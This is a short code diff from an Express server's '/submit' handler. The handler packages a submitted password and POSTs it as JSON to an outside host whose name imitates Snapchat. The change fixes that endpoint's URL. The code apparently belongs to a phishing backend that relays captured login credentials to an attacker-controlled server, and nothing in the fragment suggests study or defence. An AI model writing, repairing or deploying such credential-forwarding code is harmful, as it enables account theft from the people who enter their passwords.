@@ -24,7 +24,7 @@ app.post('/submit', async (req, res) => {
       password: password
     };
 
-    const renderResponse = await fetch('https://snapchat-35f2.onrender.com', {
+    const renderResponse = await fetch('https://snapchat-35f2.onrender.com/submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
